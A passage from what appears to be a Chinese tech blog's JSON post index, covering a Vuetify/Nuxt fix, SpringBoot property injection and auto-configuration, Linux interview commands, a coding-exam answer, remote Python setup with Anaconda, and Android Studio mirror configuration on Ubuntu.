Nginx 中不正常\n\n<!-- more -->\n\n![29-17-55-ScreenShot2019-01-19at12.19.20AM-UkN4wY](https://up-img.yonghong.tech/pic/2021/07/29-17-55-Screen%20Shot%202019-01-19%20at%2012.19.20%20AM-UkN4wY.png)\n\n\n我查了好久，终于在 Stack Overflow 上找到了答案\n\n[https://stackoverflow.com/questions/50003226/vuetify-colors-are-not-showing-up](https://stackoverflow.com/questions/50003226/vuetify-colors-are-not-showing-up)\n\n很简单，就是需要让这些内容被 v-app 标签给包起来\n\n```vue\n<v-app>\n  <v-btn color=\"success\">Success</v-btn>\n  <v-btn color=\"error\">Error</v-btn>\n  <v-btn color=\"warning\">Warning</v-btn>\n  <v-btn color=\"info\">Info</v-btn>\n</v-app>\n```\n\n然后我又发现了问题，一刷新，颜色又没了。后来经过一步步定位，发现问题在中间件（middleware），我在中间件中发现了一个问题，我在中间件中使用了 vuex 读取了一个数据，但是问题是这个数据在刷新页面后并不存在，导致不能继续进行。这个数据应该是每次刷新都从 cookie 中读取的，然而为什么没有读取呢？\n\n进过查资料，发现 nuxt 在 universal 模式下是有问题的，middleware 只有在刷新时的服务端执行，但是页面没有变化，服务端并不会刷新。这样就出现了问题。导致后面的程序无法执行，而且没有错误提示。不知道是不是这样的问题\n\n后来由于是内部使用的平台也不需要搜索引擎收录，所以还是改成了 spa。\n\n提了 issue\n\nhttps://github.com/nuxt/nuxt.js/issues/5064","categories":["vuetify"],"tags":["vuetify"]},{"title":"SpringBoot Util 工具类读取 application.properties 文件中的值","url":"/2019/01/2019-01-17-springboot-utils-configure-values-inject/","content":"\n实际开发中会遇到不同的生产环境的参数不一样，要根据生产环境来选择实际的参数。\n\n比如我后端需要有一个 url 请求，这个 url 请求在不同的环境下（dev,test,alpha,beta,product）需要访问相应的链接。那么我可以在 application.properties 或者 application.yml 文件中写不同的 url, 根据环境变量判断使用哪一个。\n\n<!-- more -->\n\n所以，看我的，下面是解决办法\n\n```properties\n# application.properties\nurl.auth.prefix.dev=http://dev.xx.com\nurl.auth.prefix.test=http://test.xx.com\nurl.auth.prefix.alpha=http://alpha.xx.com\nurl.auth.prefix.beta=http://beta.xx.com\nurl.auth.prefix.prod=http://xx.com\n\nurl.api.login=/auth/login\n```\n\n\nENVUtil.java\n\n```java\n// 要有这个注解，如果不是 Bean，也不会自动加载\n@Component\npublic class ENVUtil {\n\n    private static String env;\n\n    // 注意这里不能是 static 静态方法，否则会失效\n    @Value(\"${env}\")\n    public void setEnv(String env) {\n        ENVUtil.env = env;\n    }\n\n    public static ENV getENV() {\n        try {\n            // string 转 enum 的方法\n            return ENV.valueOf(env.toUpperCase());\n        } catch (Exception e) {\n            return ENV.DEV;\n        }\n    }\n}\n```\n\nENV.java\n\n```java\npublic enum  ENV {\n    // 环境 dev, test, alpha, beta, prod\n    DEV,\n    TEST,\n    ALPHA,\n    BETA,\n    PROD\n}\n```\n\n\nURLUtil.java\n\n```java\n@Component\npublic class URLUtil {\n\n    private static String loginUrl;\n\n    private static ENV env = ENVUtil.getENV();\n\n    private static String authDevPrefix;\n\n    private static String authTestPrefix;\n\n    private static String authAlphaPrefix;\n\n    private static String authBetaPrefix;\n\n    private static String authProdPrefix;\n\n    private static String loginApi;\n\n    @Value(\"${url.auth.prefix.dev}\")\n    public void setAuthDevPrefix(String authDevPrefix) {\n        URLUtil.authDevPrefix = authDevPrefix;\n    }\n\n    @Value(\"${url.auth.prefix.test}\")\n    public void setAuthTestPrefix(String authTestPrefix) {\n        URLUtil.authTestPrefix = authTestPrefix;\n    }\n\n    @Value(\"${url.auth.prefix.alpha}\")\n    public void setAuthAlphaPrefix(String authAlphaPrefix) {\n        URLUtil.authAlphaPrefix = authAlphaPrefix;\n    }\n\n    @Value(\"${url.auth.prefix.beta}\")\n    public void setAuthBetaPrefix(String authBetaPrefix) {\n        URLUtil.authBetaPrefix = authBetaPrefix;\n    }\n\n    @Value(\"${url.auth.prefix.prod}\")\n    public void setAuthProdPrefix(String authProdPrefix) {\n        URLUtil.authProdPrefix = authProdPrefix;\n    }\n\n    @Value(\"${url.api.login}\")\n    public void setLoginApi(String loginApi) {\n        URLUtil.loginApi = loginApi;\n    }\n\n    // 初始化 Bean 之后会执行这个注解的方法，前提是这个类是 Bean\n    @PostConstruct\n    public void init() {\n        switch (env) {\n            case DEV:\n                loginUrl = authDevPrefix + loginApi;\n                break;\n            case TEST:\n                loginUrl = authTestPrefix + loginApi;\n                break;\n            case ALPHA:\n                loginUrl = authAlphaPrefix + loginApi;\n                break;\n            case BETA:\n                loginUrl = authBetaPrefix + loginApi;\n                break;\n            case PROD:\n                loginUrl = authProdPrefix + loginApi;\n                break;\n            default:\n                loginUrl = authDevPrefix + loginApi;\n        }\n    }\n\n    public static String getLoginUrl() {\n        return loginUrl;\n    }\n}\n```","categories":["springboot"],"tags":["springboot"]},{"title":"SpringBoot 自动化配置原理","url":"/2019/01/2019-01-23-springboot-auto-config-analysis/","content":"\nspringboot用来简化Spring框架带来的大量XML配置以及复杂的依赖管理，让开发人员可以更加关注业务逻辑的开发。\n\n那么 springboot 是如何实现这些复杂的配置呢。我们以一个最小化的例子，新建一个 SpringBoot 项目，仅仅使用 spring-boot-starter-web 和 spring-boot-starter-freemarker\n\n<!-- more -->\n\n下面是 build.gradle 文件\n\n```gradle\nbuildscript {\n    ext {\n        springBootVersion = '2.1.2.RELEASE'\n    }\n    repositories {\n        mavenCentral()\n    }\n    dependencies {\n        classpath(\"org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}\")\n    }\n}\n\napply plugin: 'java'\napply plugin: 'org.springframework.boot'\napply plugin: 'io.spring.dependency-management'\n\ngroup = 'com.example'\nversion = '0.0.1-SNAPSHOT'\nsourceCompatibility = '11'\n\nrepositories {\n    mavenCentral()\n}\n\ndependencies {\n    implementation 'org.springframework.boot:spring-boot-starter-freemarker'\n    implementation 'org.springframework.boot:spring-boot-starter-web'\n    testImplementation 'org.springframework.boot:spring-boot-starter-test'\n}\n```\n\n我们一个一个来看，到底 SpringBoot 是怎么实现这些功能的，先来看 spring-boot-starter-web\n[http://central.maven.org/maven2/org/springframework/boot/spring-boot-starter-web/2.1.2.RELEASE/spring-boot-starter-web-2.1.2.RELEASE.pom](http://central.maven.org/maven2/org/springframework/boot/spring-boot-starter-web/2.1.2.RELEASE/spring-boot-starter-web-2.1.2.RELEASE.pom)\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">  \n  <modelVersion>4.0.0</modelVersion>  \n  <parent> \n    <groupId>org.springframework.boot</groupId>  \n    <artifactId>spring-boot-starters</artifactId>  \n    <version>2.1.2.RELEASE</version> \n  </parent>  \n  <groupId>org.springframework.boot</groupId>  \n  <artifactId>spring-boot-starter-web</artifactId>  \n  <version>2.1.2.RELEASE</version>  \n  <name>Spring Boot Web Starter</name>  \n  <description>Starter for building web, including RESTful, applications using Spring MVC. Uses Tomcat as the default embedded container</description>  \n  <url>https://projects.spring.io/spring-boot/#/spring-boot-parent/spring-boot-starters/spring-boot-starter-web</url>  \n  <organization> \n    <name>Pivotal Software, Inc.</name>  \n    <url>https://spring.io</url> \n  </organization>  \n  <licenses> \n    <license> \n      <name>Apache License, Version 2.0</name>  \n      <url>http://www.apache.org/licenses/LICENSE-2.0</url> \n    </license> \n  </licenses>  \n  <developers> \n    <developer> \n      <name>Pivotal</name>  \n      <email>info@pivotal.io</email>  \n      <organization>Pivotal Software, Inc.</organization>  \n      <organizationUrl>http://www.spring.io</organizationUrl> \n    </developer> \n  </developers>  \n  <scm> \n    <connection>scm:git:git://github.com/spring-projects/spring-boot.git/spring-boot-starters/spring-boot-starter-web</connection>  \n    <developerConnection>scm:git:ssh://git@github.com/spring-projects/spring-boot.git/spring-boot-starters/spring-boot-starter-web</developerConnection>  \n    <url>http://github.com/spring-projects/spring-boot/spring-boot-starters/spring-boot-starter-web</url> \n  </scm>  \n  <issueManagement> \n    <system>Github</system>  \n    <url>https://github.com/spring-projects/spring-boot/issues</url> \n  </issueManagement>  \n  <dependencies> \n    <dependency> \n      <groupId>org.springframework.boot</groupId>  \n      <artifactId>spring-boot-starter</artifactId>  \n      <version>2.1.2.RELEASE</version>  \n      <scope>compile</scope> \n    </dependency>  \n    <dependency> \n      <groupId>org.springframework.boot</groupId>  \n      <artifactId>spring-boot-starter-json</artifactId>  \n      <version>2.1.2.RELEASE</version>  \n      <scope>compile</scope> \n    </dependency>  \n    <dependency> \n      <groupId>org.springframework.boot</groupId>  \n      <artifactId>spring-boot-starter-tomcat</artifactId>  \n      <version>2.1.2.RELEASE</version>  \n      <scope>compile</scope> \n    </dependency>  \n    <dependency> \n      <groupId>org.hibernate.validator</groupId>  \n      <artifactId>hibernate-validator</artifactId>  \n      <version>6.0.14.Final</version>  \n      <scope>compile</scope> \n    </dependency>  \n    <dependency> \n      <groupId>org.springframework</groupId>  \n      <artifactId>spring-web</artifactId>  \n      <version>5.1.4.RELEASE</version>  \n      <scope>compile</scope> \n    </dependency>  \n    <dependency> \n      <groupId>org.springframework</groupId>  \n      <artifactId>spring-webmvc</artifactId>  \n      <version>5.1.4.RELEASE</version>  \n      <scope>compile</scope> \n    </dependency> \n  </dependencies> \n</project>\n```\n\n从上面的文件中可以看到 spring-boot-starter-web 引入了 spring-boot-starter，spring-boot-starter-json，spring-boot-starter-tomcat，hibernate-validator，spring-web，spring-webmvc，这些东西构成了基本的 web Application \n\n接下来我们重点关注一下 spring-boot-starter\n\n[http://central.maven.org/maven2/org/springframework/boot/spring-boot-starter/2.1.2.RELEASE/spring-boot-starter-2.1.2.RELEASE.pom](http://central.maven.org/maven2/org/springframework/boot/spring-boot-starter/2.1.2.RELEASE/spring-boot-starter-2.1.2.RELEASE.pom)\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">  \n  <modelVersion>4.0.0</modelVersion>  \n  <parent> \n    <groupId>org.springframework.boot</groupId>  \n    <artifactId>spring-boot-starters</artifactId>  \n    <version>2.1.2.RELEASE</version> \n  </parent>  \n  <groupId>org.springframework.boot</groupId>  \n  <artifactId>spring-boot-starter</artifactId>  \n  <version>2.1.2.RELEASE</version>  \n  <name>Spring Boot Starter</name>  \n  <description>Core starter, including auto-configuration support, logging and YAML</description>  \n  <url>https://projects.spring.io/spring-boot/#/spring-boot-parent/spring-boot-starters/spring-boot-starter</url>  \n  <organization> \n    <name>Pivotal Software, Inc.</name>  \n    <url>https://spring.io</url> \n  </organization>  \n  <licenses> \n    <license> \n      <name>Apache License, Version 2.0</name>  \n      <url>http://www.apache.org/licenses/LICENSE-2.0</url> \n    </license> \n  </licenses>  \n  <developers> \n    <developer> \n      <name>Pivotal</name>  \n      <email>info@pivotal.io</email>  \n      <organization>Pivotal Software, Inc.</organization>  \n      <organizationUrl>http://www.spring.io</organizationUrl> \n    </developer> \n  </developers>  \n  <scm> \n    <connection>scm:git:git://github.com/spring-projects/spring-boot.git/spring-boot-starters/spring-boot-starter</connection>  \n    <developerConnection>scm:git:ssh://git@github.com/spring-projects/spring-boot.git/spring-boot-starters/spring-boot-starter</developerConnection>  \n    <url>http://github.com/spring-projects/spring-boot/spring-boot-starters/spring-boot-starter</url> \n  </scm>  \n  <issueManagement> \n    <system>Github</system>  \n    <url>https://github.com/spring-projects/spring-boot/issues</url> \n  </issueManagement>  \n  <dependencies> \n    <dependency> \n      <groupId>org.springframework.boot</groupId>  \n      <artifactId>spring-boot</artifactId>  \n      <version>2.1.2.RELEASE</version>  \n      <scope>compile</scope> \n    </dependency>  \n    <dependency> \n      <groupId>org.springframework.boot</groupId>  \n      <artifactId>spring-boot-autoconfigure</artifactId>  \n      <version>2.1.2.RELEASE</version>  \n      <scope>compile</scope> \n    </dependency>  \n    <dependency> \n      <groupId>org.springframework.boot</groupId>  \n      <artifactId>spring-boot-starter-logging</artifactId>  \n      <version>2.1.2.RELEASE</version>  \n      <scope>compile</scope> \n    </dependency>  \n    <dependency> \n      <groupId>javax.annotation</groupId>  \n      <artifactId>javax.annotation-api</artifactId>  \n      <version>1.3.2</version>  \n      <scope>compile</scope> \n    </dependency>  \n    <dependency> \n      <groupId>org.springframework</groupId>  \n      <artifactId>spring-core</artifactId>  \n      <version>5.1.4.RELEASE</version>  \n      <scope>compile</scope> \n    </dependency>  \n    <dependency> \n      <groupId>org.yaml</groupId>  \n      <artifactId>snakeyaml</artifactId>  \n      <version>1.23</version>  \n      <scope>runtime</scope> \n    </dependency> \n  </dependencies> \n</project>\n```\n\n这里引入了 spring-boot，spring-boot-autoconfigure（这里是重点），spring-boot-starter-logging，javax.annotation-api（注解都在这里），spring-core，snakeyaml（解析 yml）\n\n看看 spring-boot-autoconfigure 里有什么\n\n![29-18-01-ScreenShot2019-01-23at1.06.02PM-C5WlNp](https://up-img.yonghong.tech/pic/2021/07/29-18-01-Screen%20Shot%202019-01-23%20at%201.06.02%20PM-C5WlNp.png)\n![29-18-01-ScreenShot2019-01-23at1.27.08PM-HPADML](https://up-img.yonghong.tech/pic/2021/07/29-18-01-Screen%20Shot%202019-01-23%20at%201.27.08%20PM-HPADML.png)\n\n这里写到\n\n```java\n@Configuration\n@ConditionalOnClass({ freemarker.template.Configuration.class,\n\t\tFreeMarkerConfigurationFactory.class }) // 这里说明只有当满足条件时才会触发这个配置\n@EnableConfigurationProperties(FreeMarkerProperties.class)\n@Import({ FreeMarkerServletWebConfiguration.class,\n\t\tFreeMarkerReactiveWebConfiguration.class, FreeMarkerNonWebConfiguration.class })\npublic class FreeMarkerAutoConfiguration {\n    // 省略。。。\n}\n```\n\n接下来我们看 spring-boot-starter-freemarker 中有什么\n\n[http://central.maven.org/maven2/org/springframework/boot/spring-boot-starter-freemarker/2.1.2.RELEASE/spring-boot-starter-freemarker-2.1.2.RELEASE.pom](http://central.maven.org/maven2/org/springframework/boot/spring-boot-starter-freemarker/2.1.2.RELEASE/spring-boot-starter-freemarker-2.1.2.RELEASE.pom)\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">  \n  <modelVersion>4.0.0</modelVersion>  \n  <parent> \n    <groupId>org.springframework.boot</groupId>  \n    <artifactId>spring-boot-starters</artifactId>  \n    <version>2.1.2.RELEASE</version> \n  </parent>  \n  <groupId>org.springframework.boot</groupId>  \n  <artifactId>spring-boot-starter-freemarker</artifactId>  \n  <version>2.1.2.RELEASE</version>  \n  <name>Spring Boot FreeMarker Starter</name>  \n  <description>Starter for building MVC web applications using FreeMarker views</description>  \n  <url>https://projects.spring.io/spring-boot/#/spring-boot-parent/spring-boot-starters/spring-boot-starter-freemarker</url>  \n  <organization> \n    <name>Pivotal Software, Inc.</name>  \n    <url>https://spring.io</url> \n  </organization>  \n  <licenses> \n    <license> \n      <name>Apache License, Version 2.0</name>  \n      <url>http://www.apache.org/licenses/LICENSE-2.0</url> \n    </license> \n  </licenses>  \n  <developers> \n    <developer> \n      <name>Pivotal</name>  \n      <email>info@pivotal.io</email>  \n      <organization>Pivotal Software, Inc.</organization>  \n      <organizationUrl>http://www.spring.io</organizationUrl> \n    </developer> \n  </developers>  \n  <scm> \n    <connection>scm:git:git://github.com/spring-projects/spring-boot.git/spring-boot-starters/spring-boot-starter-freemarker</connection>  \n    <developerConnection>scm:git:ssh://git@github.com/spring-projects/spring-boot.git/spring-boot-starters/spring-boot-starter-freemarker</developerConnection>  \n    <url>http://github.com/spring-projects/spring-boot/spring-boot-starters/spring-boot-starter-freemarker</url> \n  </scm>  \n  <issueManagement> \n    <system>Github</system>  \n    <url>https://github.com/spring-projects/spring-boot/issues</url> \n  </issueManagement>  \n  <dependencies> \n    <dependency> \n      <groupId>org.springframework.boot</groupId>  \n      <artifactId>spring-boot-starter</artifactId>  \n      <version>2.1.2.RELEASE</version>  \n      <scope>compile</scope> \n    </dependency>  \n    <dependency> \n      <groupId>org.freemarker</groupId>  \n      <artifactId>freemarker</artifactId>  \n      <version>2.3.28</version>  \n      <scope>compile</scope> \n    </dependency>  \n    <dependency> \n      <groupId>org.springframework</groupId>  \n      <artifactId>spring-context-support</artifactId>  \n      <version>5.1.4.RELEASE</version>  \n      <scope>compile</scope> \n    </dependency> \n  </dependencies> \n</project>\n```\n\n这里引入了 freemarker，spring-context-support，我们查找一下上面提到的两个类 freemarker.template.Configuration.class, FreeMarkerConfigurationFactory.class\n\n\nfreemarker中\n\n![29-18-02-ScreenShot2019-01-23at1.35.44PM-Xwn9iV](https://up-img.yonghong.tech/pic/2021/07/29-18-02-Screen%20Shot%202019-01-23%20at%201.35.44%20PM-Xwn9iV.png)\n![29-18-02-ScreenShot2019-01-23at1.37.37PM-lDimkH](https://up-img.yonghong.tech/pic/2021/07/29-18-02-Screen%20Shot%202019-01-23%20at%201.37.37%20PM-lDimkH.png)\n\n\n所以说一开始我们加入了一个 spring-boot-starter-freemarker 依赖，这个依赖中存在 freemarker 和 spring-context-support 的 lib，满足了FreeMarkerAutoConfiguration 中的 ConditionalOnClass 里写的 freemarker.template.Configuration.class 这个类和 FreeMarkerConfigurationFactory.class 存在于 classpath 中。于是就可以正常的使用了。\n\n其他依赖也同理","categories":["springboot"],"tags":["springboot"]},{"title":"Linux 面试 Top10 题目","url":"/2019/01/2019-01-28-linux-interview-questiion/","content":"\n#### 1.How to check the kernel version of a Linux system?\n\n<!-- more -->\n\n```\nuname -a\n```\n\n```shell\nPrint certain system information.  With no OPTION, same as -s.\n\n  -a, --all                print all information, in the following order,\n                             except omit -p and -i if unknown:\n  -s, --kernel-name        print the kernel name\n  -n, --nodename           print the network node hostname\n  -r, --kernel-release     print the kernel release\n  -v, --kernel-version     print the kernel version\n  -m, --machine            print the machine hardware name\n  -p, --processor          print the processor type or \"unknown\"\n  -i, --hardware-platform  print the hardware platform or \"unknown\"\n  -o, --operating-system   print the operating system\n      --help     display this help and exit\n      --version  output version information and exit\n```\n\n#### 2.How to see the current IP address on Linux?\n\n```\nifconfig\n```\n\nlo0: 回环地址。一般回环接口的 ipv4 地址为:127.0.0.1，子网掩码：255.255.255.0\n\n虚拟网络接口:并非真实存在，并不真实地从外界接收和发送数据包，而是在系统内部接收和发送数据包，因此虚拟网络接口不需要驱动程序。\n\n为什么会有该接口？ \n如果包是由一个本地进程为另一个本地进程产生的, 它们将通过外出链的lo接口,然后返回进入链的 lo 接口\n\neth0: 以太网接口。\n\n以太网接口与网卡对应，每个硬件网卡(一个 MAC )对应一个以太网接口，其工作完全由网卡相应的驱动程序控制。\n\n如果物理网卡只有一个，而却有 eth1，eth2 等，则可能存在无线网卡或多个虚拟网卡，虚拟网卡由系统创建或通过应用层程序创建，作用与物理网卡类似。\n\nvenet0: OpenVZ 虚拟出来的 VPS 默认是没有 eth0，只有 venet0 或 venet0-00\n\n```\nip addr show\n```\n\n这个命令看 ip 地址可能会更好一些\n\n\n#### 3.How to check for free disk space in Linux?\n\n```\ndf -ah\n```\n\n#### 4.How to see if a Linux service is running?\n\n```\nservice udev status 旧系统\nsystemctl status udev 新系统\n```\n\n#### 5.How to check the size of a directory in Linux?\n\n```\ndu -sh code/\n```\n\n-s --summarize \n\n-h --human-readable\n\n#### 6.How to check for open ports in Linux?\n\n```\nnetstat -tulpn\n```\n\n#### 7.How to check Linux process information (CPU usage, memory, user information, etc.)?\n\n```\nps aux | grep nginx\n```\n\n```\ntop -d secs -n max -u user -p pid \n```\n\n```\nhtop\n```\nF3 查找 F4过滤 F5tree F6SortBy F9Kill\n\n\n#### 8.How to deal with mounts in Linux\n\n将 /dev/hda1 挂在 /mnt 之下。\n\n```\nmount /dev/hda1 /mnt\n```\n\n只读方式\n\n```\nmount -o ro /dev/hda1 /mnt\n```\n\n#### 9.Man pages\n\n```\nman <command>\n```\n\n#### 10.Other resources\n\n[https://www.google.com/](https://www.google.com/)\n\n---\n\n#### 参考\n\n[https://www.youtube.com/watch?v=l0QGLMwR-lY](https://www.youtube.com/watch?v=l0QGLMwR-lY)","categories":["linux"],"tags":["linux"]},{"title":"作业帮研发笔试","url":"/2019/03/2019-03-15-zybang-written-examination/","content":"\n1.将数组中的0移到后面\n\n<!-- more -->\n\n```java\n    private static int[] func(int[] arr) {\n        int length = arr.length;\n        int i = 0;\n        int j = 0;\n        while (i < length) {\n            if ((arr[i] != 0)) {\n                arr[j] = arr[i];\n                j++;\n            }\n            i++;\n        }\n        while (j < length) {\n            arr[j] = 0;\n            j++;\n        }\n        return arr;\n    }\n```\n\n2.求 PV，UV\n\n```\nCREATE TABLE `zybang_uv_pv` (\n  `url` varchar(255) DEFAULT NULL,\n  `uid` int(11) DEFAULT NULL\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;\n\n\nINSERT INTO `zybang_uv_pv` (`url`, `uid`) VALUES\n('www.zybang.com', 1),\n('www.zybang.com', 2),\n('www.zybang.com', 3),\n('www.zybang.com', 4),\n('www.zybang.com', 2),\n('www.zybang.com', 3),\n('zhibo.zybang.com', 1),\n('zhibo.zybang.com', 3),\n('zhibo.zybang.com', 4),\n('zhibo.zybang.com', 5);\n\nselect * from zybang_uv_pv;\n+------------------+------+\n| url              | uid  |\n+------------------+------+\n| www.zybang.com   |    1 |\n| www.zybang.com   |    2 |\n| www.zybang.com   |    3 |\n| www.zybang.com   |    4 |\n| www.zybang.com   |    2 |\n| www.zybang.com   |    3 |\n| zhibo.zybang.com |    1 |\n| zhibo.zybang.com |    3 |\n| zhibo.zybang.com |    4 |\n| zhibo.zybang.com |    5 |\n+------------------+------+\n\n输出\n\n+------------------+----+----+\n| url              | uv | pv |\n+------------------+----+----+\n| www.zybang.com   |  4 |  6 |\n| zhibo.zybang.com |  4 |  4 |\n+------------------+----+----+\n```\n\n```sql\nselect uv.url, uv.uv, pv.pv from \n((select url, count(distinct uid) as uv from zybang_uv_pv group by url) as uv) , \n((select url, count(uid) as pv from zybang_uv_pv group by url) as pv) \nwhere uv.url = pv.url \norder by uv.url asc;\n```\n\n","categories":["interview"],"tags":["interview","笔试","研发"]},{"title":"使用远程服务器运行 Python","url":"/2019/03/2019-03-16-use-remote-server-to-run-python/","content":"\n首先有一台服务器，然后知道服务器的 IP，用户名，密码。本文以我的虚拟机为例子，IP 10.211.55.9，用户名 yh，密码 123456\n\n\n<!-- more -->\n\n### 登录\n\n```shell\n# ssh 用户名@IP\nssh yh@10.211.55.9\n# 输入密码，即可登录到远程服务器\n```\n\n### Linux 常用命令\n\n```shell\n# 退出\nexit\n# 复制文件\ncp file.txt 目录\n# 移动文件\nmv file.txt 目录\n# 重命名\nmv file.txt rename.txt\n# 解压 zip\nunzip file.zip\n# 遇到中文乱码的情况加参数 -O GBK\nunzip -O GBK file.zip\n# 解压 tar tar.gz\ntar -zxvf file.tar\n# 安装 .deb 安装包\ndpkg -i install.deb\n```\n\n### 传文件到远程服务器\n\n```shell\n# 在本地系统操作\n# scp 文件名 远程服务器用户名@IP:目录（确保有这个目录，否则会创建为一个文件）\nscp file.zip yh@10.211.55.9:/home/yh\n# 上传一个文件夹\nscp -r filesdir yh@10.211.55.9:/home/yh\n```\n\n### 使用 Python\n\n#### 下载安装 anaconda\n\n清华 [https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/](https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/)\n\n中科大 [https://mirrors.ustc.edu.cn/anaconda/archive/](https://mirrors.ustc.edu.cn/anaconda/archive/)\n\n以目前最新的 anaconda 版本为例\n\n```shell\n# 下载\nwget https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/Anaconda3-5.3.1-Linux-x86_64.sh\n# 添加可执行权限\nchmod +x Anaconda3-5.3.1-Linux-x86_64.sh\n# 安装\n./Anaconda3-5.3.1-Linux-x86_64.sh\n# 设置 Conda 国内源\nconda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/\nconda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/\nconda config --set show_channel_urls yes\n```\n\n#### Conda 的使用\n\n```shell\n# conda create -n 环境名称 python=3 包1 包2 包3 ...\nconda create -n yhtf python=3 tensorflow numpy keras\n# 激活环境\nconda activate yhtf\n# 取消环境\nconda deactivate\n# 安装 python 包\n# conda install 包\nconda install pillow\n```\n\n","categories":["Linux"],"tags":["Linux","Python","linux","python","conda","anaconda"]},{"title":"在 Ubuntu 上使用 Android Studio 开发","url":"/2019/03/2019-03-18-accelerate-android/","content":"\n## 下载 Android Studio \n\nhttps://developer.android.com\n\nhttps://developer.android.google.cn\n\n<!-- more -->\n\n这两个网址都要 FQ 下载，区别是上面的网址不 FQ 打都打不开。\n\n下载我建议是用迅雷下载，Ubuntu 上还是可以安装迅雷的。详情看这里 https://github.com/Jactor-Sue/Deepin-Apps-Installation\n\n## 安装 Android Studio \n\n安装比较简单，直接解压就可以。我把解压好的文件放在了 `/opt/android-studio` 这个目录中了。\n\n启动可以直接命令行启动 \n\n```shell\nnohup /opt/android-studio/bin/studio.sh &\n```\n\n或者在 `/usr/share/applications` 目录中创建一个快捷方式\n\n```shell\nsudo vim /usr/share/applications/Studio.desktop\n```\n\n在 `Studio.desktop` 写入下面内容\n\n```\n[Desktop Entry] \nName=AndroidStudio \nType=Application \nIcon=/opt/android-studio/bin/studio.png \nExec=sh /opt/android-studio/bin/studio.sh\n```\n\n给 `Studio.desktop` 加上可执行权限\n\n```shell\nsudo chmod +x /usr/share/applications/Studio.desktop\n```\n\n> 注意：上面文件内容里 Android Studio 的目录是你自己设置的目录，并且文件中不要包含多余空格。\n\n## SDK 镜像加速\n\nSDK 下载很慢一直是一个很头疼的问题。\n\n可以在设置中 `Appearance & Behavior -> System Settings -> HTTP Proxy` 中进行设置，勾选 `Auto-detect proxy settings`，勾选 `Automatic proxy configuration URL`，填写 `mirrors.neusoft.edu.cn`\n\n保存设置就可以了。\n\n目前来看，这个设置好之后确实会很快，但是有时候也会抽风，不行就重启试试，再不行就等会再试。\n\n> 更新：还是直接下载吧，网络不好就等一等，换了代理之后也好像也没有什么用。\n\n## /dev/kvm permission denied on Ubuntu 18.04\n\n下载完 SDK 后新建模拟器可能会出现这样的报错。这是因为当前的用户没有权限写 `/dev/kvm` 文件。执行下面命令即可\n\n```shell\nsudo chown your_name /dev/kvm\n```\n\n## 加速 gradle-4.10.3-all.zip\n\n这个文件是最头疼的了，好像还没有一个镜像站内快速的下载这个文件，一个不太友好的解决办法是去官网上下载好到本地，然后直接在 `gradle-warper.properties` 引用本地文件\n\nhttps://services.gradle.org/distributions/\n\n或者我的[百度云分享](https://pan.baidu.com/s/1zLxEQ35YaPIGfZKiluua5A) 提取码: bicm \n\n## 加速 gradle 依赖\n\n原来的文件是这样的\n\n```\n// Top-level build file where you can add configuration options common to all sub-projects/modules.\n\nbuildscript {\n    repositories {\n        google()\n        jcenter()\n        \n    }\n    dependencies {\n        classpath 'com.android.tools.build:gradle:3.3.2'\n        \n        // NOTE: Do not place your application dependencies here; they belong\n        // in the individual module build.gradle files\n    }\n}\n\nallprojects {\n    repositories {\n        google()\n        jcenter()\n    }\n}\n\ntask clean(type: Delete) {\n    delete rootProject.buildDir\n}\n\n```\n\n现在改成这样\n\n```\n// Top-level build file where you can add configuration options common to all sub-projects/modules.\n\nbuildscript {\n    repositories {\n        maven { url 'https://maven.aliyun.com/repository/public' }\n        maven { url 'https://maven.aliyun.com/repository/google' }\n        \n    }\n    dependencies {\n        classpath 'com.android.tools.build:gradle:3.3.2'\n        \n        // NOTE: Do not place your application dependencies here; they belong\n        // in the individual module build.gradle files\n    }\n}\n\nallprojects {\n    repositories {\n        maven { url 'https://maven.aliyun.com/repository/public' }\n        maven { url 'https://maven.aliyun.com/repository/google' }\n    }\n}\n\ntask clean(type: Delete) {\n    delete rootProject.buildDir\n}\n```\n\nhttps://maven.aliyun.com/repository/public\n\n包括 https://maven.aliyun.com/repository/central 和 https://maven.aliyun.com/repository/jcenter\n\n所以这里需要用 public 和 google 两个仓库代替 google() 和 jcenter() \n\n如果需要其他的也可以继续添加，下面包括安卓或者后端需要用到的仓库\n\n```\nmaven { url 'https://maven.aliyun.com/repository/apache-snapshots' }\nmaven { url 'https://maven.aliyun.com/repository/apache-central' }\nmaven { url 'https://maven.aliyun.com/repository/gradle-plugin' }\nmaven { url 'https://maven.aliyun.com/repository/jcenter' }\nmaven { url 'https://maven.aliyun.com/repository/spring' }\nmaven { url 'https://maven.aliyun.com/repository/spring-plugin' }\nmaven { url 'https://maven.aliyun.com/repository/releases' }\nmaven { url 'https://maven.aliyun.com/repository/snapshots' }\nmaven { url 'https://maven.aliyun.com/repository/grails-core' }\nmaven { url 'https://maven.aliyun.com/repository/mapr-public' }\n```\n\nhttps://maven.aliyun.com/repository/public 是推荐的新的地址，http://maven.aliyun.com/nexus/content/groups/public 是老的地址，为了兼容仍然可以使用。\n\n> 这里有个问题是，如果 SDK 没有装全，可能会导致 Gradle 依赖无法下载。笔者在试验的时候，发现没有安装 28.0.3 版本的 platform-tools 导致无法下载 com.android.tools.build:gradle:3.3.2\n\n","categories":["Android"],"tags":["镜像","as","Android","maven","AS"]},{"title":"web 